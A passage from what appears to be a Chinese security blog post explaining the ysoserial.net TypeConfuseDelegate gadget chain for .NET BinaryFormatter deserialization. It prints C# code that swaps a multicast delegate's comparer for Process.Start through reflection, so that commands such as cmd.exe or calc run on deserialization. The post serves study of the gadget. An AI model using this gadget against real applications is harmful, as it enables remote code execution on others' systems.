class="line">&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ByFileExtension</span> : <span class="title">IComparer</span>&lt;<span class="title">string</span>&gt;</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">string</span> xExt, yExt;</span><br><span class="line"></span><br><span class="line">        CaseInsensitiveComparer caseiComp = <span class="keyword">new</span> CaseInsensitiveComparer();</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="built_in">int</span> <span class="title">Compare</span>(<span class="params"><span class="built_in">string</span> x, <span class="built_in">string</span> y</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// Parse the extension from the file name.</span></span><br><span class="line">            xExt = x.Substring(x.LastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line">            yExt = y.Substring(y.LastIndexOf(<span class="string">&quot;.&quot;</span>) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">            <span class="comment">// Compare the file extensions.</span></span><br><span class="line">            <span class="built_in">int</span> vExt = caseiComp.Compare(xExt, yExt);</span><br><span class="line">            <span class="keyword">if</span> (vExt != <span class="number">0</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                <span class="keyword">return</span> vExt;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">else</span></span><br><span class="line">            &#123;</span><br><span class="line">                <span class="comment">// The extension is the same,</span></span><br><span class="line">                <span class="comment">// so compare the filenames.</span></span><br><span class="line">                <span class="keyword">return</span> caseiComp.Compare(x, y);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"><span class="built_in">string</span>[] args</span>)</span></span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">var</span> <span class="keyword">set</span> = <span class="keyword">new</span> SortedSet&lt;<span class="built_in">string</span>&gt;(<span class="keyword">new</span> ByFileExtension());</span><br><span class="line">            <span class="keyword">set</span>.Add(<span class="string">&quot;test.c&quot;</span>);</span><br><span class="line">            <span class="keyword">set</span>.Add(<span class="string">&quot;test.b&quot;</span>);</span><br><span class="line">            <span class="keyword">set</span>.Add(<span class="string">&quot;test.a&quot;</span>);</span><br><span class="line">            <span class="keyword">foreach</span> (<span class="keyword">var</span> item <span class="keyword">in</span> <span class="keyword">set</span>)</span><br><span class="line">            &#123;</span><br><span class="line">                Console.WriteLine(item.ToString());</span><br><span class="line">            &#125;</span><br><span class="line">            Console.ReadKey();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 输出</span></span><br><span class="line">test.a</span><br><span class="line">test.b</span><br><span class="line">test.c</span><br></pre></td></tr></table></figure>
<p>看懂这个demo的话   就会对我们下面yso链子有更好的理解了</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240226100148484.png" alt="image-20240226100148484"></p>
<ul>
<li>实现了这个<code>IComparer&lt;string&gt;</code>接口</li>
<li>重写了这个<code>Compare</code>函数</li>
</ul>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240226100353073.png" alt="image-20240226100353073"></p>
<p>然后将我们的ByFileExtension类放入到SortedSet类中  然后set.Add添加值进去比较</p>
<p>那么这个是我们自己手动添加的类和比较器  所以在yso是得自动生成  </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240226100555050.png" alt="image-20240226100555050"></p>
<p>都是必须得满足这两个条件</p>
<h3 id="Gadgets"><a href="#Gadgets" class="headerlink" title="Gadgets"></a>Gadgets</h3><p>会看yso中的构造链</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Delegate da = <span class="keyword">new</span> Comparison&lt;<span class="built_in">string</span>&gt;(String.Compare);</span><br><span class="line">Comparison&lt;<span class="built_in">string</span>&gt; d = (Comparison&lt;<span class="built_in">string</span>&gt;)MulticastDelegate.Combine(da, da);</span><br><span class="line">IComparer&lt;<span class="built_in">string</span>&gt; comp = Comparer&lt;<span class="built_in">string</span>&gt;.Create(d);</span><br><span class="line">SortedSet&lt;<span class="built_in">string</span>&gt; <span class="keyword">set</span> = <span class="keyword">new</span> SortedSet&lt;<span class="built_in">string</span>&gt;(comp);</span><br></pre></td></tr></table></figure>
<p>跟进Comparison函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240226101018984.png" alt="image-20240226101018984"></p>
<p>是一个委派函数 </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240226101347624.png" alt="image-20240226101347624"></p>
<p>这个就是创建了两个Compare函数  </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240226101415467.png" alt="image-20240226101415467"></p>
<p>而<code>Comparer&lt;T&gt;</code>抽象类实现了<code>IComparer&lt;T&gt;</code>接口 </p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240226101439662.png" alt="image-20240226101439662"></p>
<p>那么这个Create就是创建了实现了 IComparer接口  并有两个Compare方法的一个类   并且放入列表中</p>
<p>然后又因为我们委派的是Comparison函数</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240226101838201.png" alt="image-20240226101838201"></p>
<p>如果我们将Process.Start设置为比较器，那么向集合中添加的值就是Process.Start的参数，由此来进行命令执行。在委托中我们提到，委托的方法签名和委托必须一致，而对于<code>SortedSet&lt;string&gt;</code>类来说，其比较函数类型为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">int Comparison&lt;in T&gt;(T x, T y);</span><br></pre></td></tr></table></figure>
<p>但是而Process.Start()的是：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">public static Process Start(string fileName, string arguments);</span><br></pre></td></tr></table></figure>
<p>返回类型不一致  一个是Process，一个是int   这样就会导致反序列化失败   那么我们就得借助多播委派来解决这个问题了</p>
<figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 创建一个string的比较器</span></span><br><span class="line">Delegate da = <span class="keyword">new</span> Comparison&lt;<span class="built_in">string</span>&gt;(String.Compare);</span><br><span class="line"><span class="comment">// 用两个string的比较器合并为一个多播委托(生成两个Compare函数)</span></span><br><span class="line">Comparison&lt;<span class="built_in">string</span>&gt; d = (Comparison&lt;<span class="built_in">string</span>&gt;)MulticastDelegate.Combine(da, da);</span><br><span class="line"><span class="comment">// Create()函数返回new ComparisonComparer&lt;T&gt;(d) (生成一个类)</span></span><br><span class="line">IComparer&lt;<span class="built_in">string</span>&gt; comp = Comparer&lt;<span class="built_in">string</span>&gt;.Create(d);</span><br><span class="line"><span class="comment">// 将ComparisonComparer赋值给SortedSet的比较器</span></span><br><span class="line">SortedSet&lt;<span class="built_in">string</span>&gt; <span class="keyword">set</span> = <span class="keyword">new</span> SortedSet&lt;<span class="built_in">string</span>&gt;(comp);</span><br><span class="line"><span class="comment">// set.Add(&quot;cmd.exe&quot;)</span></span><br><span class="line"><span class="keyword">set</span>.Add(inputArgs.CmdFileName);</span><br><span class="line"><span class="comment">// set.Add(&quot;calc&quot;)</span></span><br><span class="line"><span class="keyword">set</span>.Add(inputArgs.CmdArguments);</span><br><span class="line"><span class="comment">// 反射修改_invocationList</span></span><br><span class="line">FieldInfo fi = <span class="keyword">typeof</span>(MulticastDelegate).GetField(<span class="string">&quot;_invocationList&quot;</span>, BindingFlags.NonPublic | BindingFlags.Instance);</span><br><span class="line"><span class="built_in">object</span>[] invoke_list = d.GetInvocationList();</span><br><span class="line"><span class="comment">// 修改_invocationList 添加 Process::Start(string, string) 修改第二个Compare函数为Process.Start</span></span><br><span class="line">invoke_list[<span class="number">1</span>] = <span class="keyword">new</span> Func&lt;<span class="built_in">string</span>, <span class="built_in">string</span>, Process&gt;(Process.Start);</span><br><span class="line">fi.SetValue(d, invoke_list);</span><br></pre></td></tr></table></figure>
<p>那么为什么多播委派能解决这个签名不一致的问题   原作者给出的解释</p>
<blockquote>
<p>The only weird thing about this code is TypeConfuseDelegate. It’s a long standing issue that .NET delegates don’t always enforce their type signature, especially the return value. In this case we create a two entry multicast delegate (a delegate which will run multiple single delegates sequentially), setting one delegate to String::Compare which returns an int, and another to Process::Start which returns an instance of the Process class. This works, even when deserialized and invokes the two separate methods. It will then return the created process object as an integer, which just means it will return the pointer to the instance of the process object.</p>
</blockquote>
<p>简单来讲就是 多播委托传递的是指针</p>
<p>先在SortedSet中触发OnDeserialization函数   然后调用Add方法</p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240226103010401.png" alt="image-20240226103010401"></p>
<p>跟进add方法后 发现会多次调用我们的Compare方法   但是Compare方法已经被我们反射修改为Process.Start(string,string)</p>
<p><strong>(准确来说是第二次  因为我们是修改第二个Compare方法)</strong></p>
<p><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="../images/image-20240226102833194.png" alt="image-20240226102833194"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://ke1nys.github.io">ke1nys</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://ke1nys.github.io/posts/4af57b1b.html">https://ke1nys.github.io/posts/4af57b1b.html</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://ke1nys.github.io" target="_blank">ke1nys`Blog</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/dotnet/">dotnet</a></div><div class="post_share"><div class="social-share" data-image="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/posts/d491eeb8.html"><img class="prev-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Dotnet-Deserialization-04</div></div></a></div><div class="next-post pull-right"><a href="/posts/3df24b8d.html"><img class="next-cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">Dotnet-Deserialization-02</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/posts/a4fb1a37.html" title="Dotnet-Deserialization-01"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-21</div><div class="title">Dotnet-Deserialization-01</div></div></a></div><div><a href="/posts/3df24b8d.html" title="Dotnet-Deserialization-02"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-22</div><div class="title">Dotnet-Deserialization-02</div></div></a></div><div><a href="/posts/d491eeb8.html" title="Dotnet-Deserialization-04"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-02-26</div><div class="title">Dotnet-Deserialization-04</div></div></a></div><div><a href="/posts/3a9f8f94.html" title="Dotnet-Deserialization-06"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-05</div><div class="title">Dotnet-Deserialization-06</div></div></a></div><div><a href="/posts/4d98bf02.html" title="Dotnet-Deserialization-07"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-06</div><div class="title">Dotnet-Deserialization-07</div></div></a></div><div><a href="/posts/dd27a293.html" title="Dotnet-Deserialization-08"><img class="cover" src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2024-03-11</div><div class="title">Dotnet-Deserialization-08</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="/img/qq.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">ke1nys</div><div class="author-info__description">生命不息,折腾不止</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">195</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">132</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">0</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ke1nys/ke1nys.github.io"><i class="fab fa-github"></i><span>Follow Me</span></a></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">欢迎来到我的博客一起学习嗷~</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#BinaryFormatter"><span class="toc-number">1.</span> <span class="toc-text">BinaryFormatter</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Binder-%E8%BF%87%E6%BB%A4%E5%99%A8"><span class="toc-number">2.</span> <span class="toc-text">Binder 过滤器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TextFormattingRunProperties%E5%88%A9%E7%94%A8%E9%93%BE"><span class="toc-number">3.</span> <span class="toc-text">TextFormattingRunProperties利用链</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#DataSet-Binary%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">4.</span> <span class="toc-text">DataSet(Binary二次反序列化)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#TypeConfuseDelegate"><span class="toc-number">5.</span> <span class="toc-text">TypeConfuseDelegate</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A7%94%E6%89%98"><span class="toc-number">5.1.</span> <span class="toc-text">委托</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%A4%9A%E6%92%AD%E5%A7%94%E6%89%98"><span class="toc-number">5.2.</span> <span class="toc-text">多播委托</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#SortedSet%E5%92%8CComparer"><span class="toc-number">5.3.</span> <span class="toc-text">SortedSet和Comparer</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Gadgets"><span class="toc-number">5.4.</span> <span class="toc-text">Gadgets</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/posts/39e9c7a4.html" title="基于域信任关系的域攻击"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="基于域信任关系的域攻击"/></a><div class="content"><a class="title" href="/posts/39e9c7a4.html" title="基于域信任关系的域攻击">基于域信任关系的域攻击</a><time datetime="2024-05-28T12:36:37.000Z" title="发表于 2024-05-28 20:36:37">2024-05-28</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/eca6cb79.html" title="Windows内网渗透-详细"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Windows内网渗透-详细"/></a><div class="content"><a class="title" href="/posts/eca6cb79.html" title="Windows内网渗透-详细">Windows内网渗透-详细</a><time datetime="2024-05-17T07:46:22.000Z" title="发表于 2024-05-17 15:46:22">2024-05-17</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/840eff0.html" title="UTF-8 Overlong-Encoding"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://fastly.jsdelivr.net/gh/jerryc127/CDN@latest/cover/default_bg.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="UTF-8 Overlong-Encoding"/></a><div class="content"><a class="title" href="/posts/840eff0.html" title="UTF-8 Overlong-Encoding">UTF-8 Overlong-Encoding</a><time datetime="2024-05-04T08:42:08.000Z" title="发表于 2024-05-04 16:42:08">2024-05-04</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/e06d273a.html" title="Jndi高版本绕过"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Jndi高版本绕过"/></a><div class="content"><a class="title" href="/posts/e06d273a.html" title="Jndi高版本绕过">Jndi高版本绕过</a><time datetime="2024-05-03T09:28:45.000Z" title="发表于 2024-05-03 17:28:45">2024-05-03</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/posts/99d00ea3.html" title="frp-二开"><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://i.loli.net/2020/05/01/gkihqEjXxJ5UZ1C.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="frp-二开"/></a><div class="content"><a class="title" href="/posts/99d00ea3.html" title="frp-二开">frp-二开</a><time datetime="2024-05-01T10:14:33.000Z" title="发表于 2024-05-01 18:14:33">2024-05-01</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2022 - 2024 By ke1nys</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><i class="fas fa-arrow-up"></i></button></div></div><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div></div></div><div id="search-mask"></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox.umd.min.js"></script><script src="https://cdn.jsdelivr.net/npm/vanilla-lazyload/dist/lazyload.iife.min.js"></script><script src="/js/search/local-search.js"></script><div class="js-pjax"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/aplayer/dist/APlayer.min.js"></script><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/metingjs/dist/Meting.min.js"></script><div class="app-refresh" id="app-refresh" style="position: fixed;top: -2.2rem;left: 0;right: 0;z-index: 99999;padding: 0 1rem;font-size: 15px;height: 2.2rem;transition: all 0.3s ease;"><div class="app-refresh-wrap" style=" display: flex;color: #fff;height: 100%;align-items: center;justify-content: center;"><label>✨ 有新文章啦！ 👉</label><a href="javascript:void(0)" onclick="location.reload()"><span style="color: #fff;text-decoration: underline;cursor: pointer;">🍗点击食用🍔</span></a></div></div><script>if ('serviceWorker' in navigator) {
if (navigator.serviceWorker.controller) {
navigator.serviceWorker.addEventListener('controllerchange', function() {
showNotification()
})
}
window.addEventListener('load', function() {
navigator.serviceWorker.register('/sw.js')
})
}
function showNotification() {
if (GLOBAL_CONFIG.Snackbar) {
var snackbarBg =
document.documentElement.getAttribute('data-theme') === 'light' ?
GLOBAL_CONFIG.Snackbar.bgLight :
GLOBAL_CONFIG.Snackbar.bgDark
var snackbarPos = GLOBAL_CONFIG.Snackbar.position
Snackbar.show({
text: '✨ 有新文章啦！ 👉',
backgroundColor: snackbarBg,
duration: 500000,
pos: snackbarPos,
actionText: '🍗点击食用🍔',
actionTextColor: '#fff',
onActionClick: function(e) {
location.reload()
},
})
} else {
var showBg =
document.documentElement.getAttribute('data-theme') === 'light' ?
'#3b70fc' :
'#1f1f1f'
var cssText = `top: 0; background: ${showBg};`
document.getElementById('app-refresh').style.cssText = cssText
}
}</script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div><!-- hexo injector body_end start --><div class="js-pjax"><script async="async">var arr = document.getElementsByClassName('recent-post-item');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__zoomIn');
    arr[i].setAttribute('data-wow-duration', '1.5s');
    arr[i].setAttribute('data-wow-delay', '200ms');
    arr[i].setAttribute('data-wow-offset', '30');
    arr[i].setAttribute('data-wow-iteration', '1');
  }</script><script async="async">var arr = document.getElementsByClassName('card-widget');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__zoomIn');
    arr[i].setAttribute('data-wow-duration', '');
    arr[i].setAttribute('data-wow-delay', '200ms');
    arr[i].setAttribute('data-wow-offset', '');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__flipInY');
    arr[i].setAttribute('data-wow-duration', '3s');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script><script async="async">var arr = document.getElementsByClassName('flink-list-card');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__animated');
    arr[i].setAttribute('data-wow-duration', '3s');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script><script async="async">var arr = document.getElementsByClassName('article-sort-item');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__slideInRight');
    arr[i].setAttribute('data-wow-duration', '1.5s');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__flipInY');
    arr[i].setAttribute('data-wow-duration', '3s');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script><script async="async">var arr = document.getElementsByClassName('site-card');
for(var i = 0;i<arr.length;i++){
    arr[i].classList.add('wow');
    arr[i].classList.add('animate__animated');
    arr[i].setAttribute('data-wow-duration', '3s');
    arr[i].setAttribute('data-wow-delay', '');
    arr[i].setAttribute('data-wow-offset', '');
    arr[i].setAttribute('data-wow-iteration', '');
  }</script></div><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow.min.js"></script><script defer src="https://cdn.cbd.int/hexo-butterfly-wowjs/lib/wow_init.js"></script><script data-pjax>
  function butterfly_footer_beautify_injector_config(){
    var parent_div_git = document.getElementById('footer-wrap');
    var item_html = '<div id="workboard"></div><p id="ghbdages"><a class="github-badge" target="_blank" href="https://hexo.io/" style="margin-inline:5px" data-title="博客框架为Hexo_v5.4.0" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Frame-Hexo-blue?style=flat&amp;logo=hexo" alt=""/></a><a class="github-badge" target="_blank" href="https://butterfly.js.org/" style="margin-inline:5px" data-title="主题版本Butterfly_v4.2.2" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/Theme-Butterfly-6513df?style=flat&amp;logo=bitdefender" alt=""/></a><a class="github-badge" target="_blank" href="https://www.jsdelivr.com/" style="margin-inline:5px" data-title="本站使用JsDelivr为静态资源提供CDN加速" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" data-lazy-src="https://img.shields.io/badge/CDN-jsDelivr-orange?style=flat&amp;logo=jsDelivr" alt=""/></a><a class="github-badge" target="_blank" href="https://beian.miit.gov.cn/#/Integrated/index" style="margin-inline:5px" data-title="本站已在湘进行备案" title=""><img src= "data:image/gif;base64,R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7" 